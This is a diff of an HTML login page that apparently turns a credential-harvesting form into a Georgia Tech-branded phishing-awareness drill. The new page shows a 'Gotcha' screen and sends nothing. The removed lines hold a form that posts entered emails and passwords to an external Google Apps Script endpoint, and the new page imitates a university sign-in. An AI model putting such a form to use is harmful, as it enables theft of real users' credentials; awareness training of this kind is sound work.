@@ -1,65 +1,121 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure Login</title>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Georgia Tech • Sign In</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+    :root{
+      --gt-navy:#003057;
+      --gt-gold:#B3A369;
+      --ink:#1c2430;
+      --bg:#f5f6f8;
+      --card:#ffffff;
     }
-    .login-box {
-      background: white;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-      width: 300px;
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family:system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background:var(--bg); color:var(--ink); min-height:100vh; display:grid; place-items:center;
     }
-    .login-box h2 {
-      margin-bottom: 20px;
-      text-align: center;
+    .shell{width:min(720px,100%); padding:24px}
+    .brand{
+      display:flex; align-items:center; gap:14px; margin-bottom:20px; justify-content:center;
     }
-    input[type="text"], input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+    .mark{
+      width:44px; height:44px; border-radius:12px; background:linear-gradient(145deg,var(--gt-gold),#d6c693);
+      display:grid; place-items:center; color:var(--gt-navy); font-weight:900; letter-spacing:.5px;
+      box-shadow:0 6px 18px rgba(0,0,0,.12);
     }
-    button {
-      width: 100%;
-      padding: 10px;
-      background-color: #0066cc;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
+    .wordmark{
+      font-weight:800; color:var(--gt-navy); letter-spacing:.06em; text-transform:uppercase;
     }
-    button:hover {
-      background-color: #004c99;
+    .card{
+      background:var(--card); border-radius:14px; box-shadow:0 14px 40px rgba(0,0,0,.10);
+      padding:28px; margin-inline:auto; width:min(420px,100%);
     }
+    h1{margin:0 0 6px; font-size:1.25rem; color:var(--gt-navy); text-align:center}
+    p.sub{margin:0 0 18px; text-align:center; color:#5b6777; font-size:.95rem}
+    label{display:block; font-weight:600; margin:14px 0 6px; color:#223}
+    input{
+      width:100%; padding:12px 14px; border:1px solid #d7dbe3; border-radius:10px; font-size:1rem; outline:none;
+    }
+    input:focus{border-color:var(--gt-navy)}
+    .btn{
+      width:100%; margin-top:16px; padding:12px 16px; border:0; border-radius:10px;
+      background:var(--gt-navy); color:white; font-weight:700; cursor:pointer;
+    }
+    .btn:hover{filter:brightness(1.05)}
+    .meta{margin-top:10px; font-size:.8rem; color:#6b7280; text-align:center}
+    /* Gotcha screen */
+    .gotcha{
+      position:fixed; inset:0; background:radial-gradient(1200px 600px at 50% -10%, #fdf8e7, #f5f6f8 55%);
+      display:grid; place-items:center; z-index:9999;
+      animation:fadeIn .3s ease-out both;
+    }
+    .gotcha .box{
+      background:white; border:2px solid var(--gt-gold); border-radius:16px; padding:28px 24px; text-align:center;
+      box-shadow:0 18px 46px rgba(0,0,0,.12);
+      max-width:580px; margin:24px;
+    }
+    .gotcha h2{margin:0 0 10px; font-size:1.6rem; color:var(--gt-navy)}
+    .gotcha p{margin:0; color:#374556}
+    .tag{display:inline-block; margin-top:14px; padding:6px 10px; border-radius:999px; background:var(--gt-gold); color:var(--gt-navy); font-weight:800; letter-spacing:.04em}
+    @keyframes fadeIn{from{opacity:0; transform:translateY(6px)} to{opacity:1; transform:translateY(0)}}
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <h2>Sign In</h2>
-    <form method="POST" action="https://script.google.com/macros/s/AKfycbwAEI4fmn9ixDrtnaymvYu0Bv7RfkDiKDDQ9YVqCqwdacmokoDTmed2jf7QFubHa5ZS/exec">
-      <label for="email">Email</label>
-      <input type="text" id="email" **name="email"** placeholder="you@example.com" required><br><br>
+  <div class="shell">
+    <div class="brand" aria-hidden="true">
+      <div class="mark">GT</div>
+      <div class="wordmark">Georgia Tech</div>
+    </div>
 
-      <label for="password">Password</label>
-      <input type="password" id="password" **name="password"** required><br><br>
+    <div class="card" role="region" aria-labelledby="heading">
+      <h1 id="heading">Sign In</h1>
+      <p class="sub">Use your Georgia Tech credentials</p>
 
-      <button type="submit">Sign In</button>
-    </form>
+      <!-- Form does NOT post anywhere; JS intercepts submission -->
+      <form id="loginForm" novalidate>
+        <label for="email">Email</label>
+        <input id="email" type="email" placeholder="you@gatech.edu" autocomplete="username" required>
+
+        <label for="password">Password</label>
+        <input id="password" type="password" placeholder="••••••••" autocomplete="current-password" required>
+
+        <button class="btn" type="submit">Submit</button>
+        <div class="meta">This is a training exercise.</div>
+      </form>
+    </div>
   </div>
+
+  <div id="gotcha" class="gotcha" style="display:none" aria-live="assertive">
+    <div class="box">
+      <div class="mark" style="margin-inline:auto; margin-bottom:10px;">GT</div>
+      <h2>Gotcha from <strong>Group 66</strong>!!!</h2>
+      <p>You just interacted with a Georgia Tech cybersecurity training simulation.</p>
+      <span class="tag">Awareness • Phishing Drill</span>
+    </div>
+  </div>
+
+  <script>
+    // Intercept submit & show the Gotcha screen.
+    // No network requests are made; nothing is sent anywhere.
+    const form = document.getElementById('loginForm');
+    const gotcha = document.getElementById('gotcha');
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();            // stop navigation & posting
+      // Optional: clear any filled fields
+      try { form.reset(); } catch (_) {}
+      // Reveal the gotcha overlay
+      gotcha.style.display = 'grid';
+      // Optionally, replace the whole page after a moment:
+      // setTimeout(()=>document.body.innerHTML = gotcha.outerHTML, 50);
+    });
+  </script>
 </body>
 </html>
+
+
 
 
 
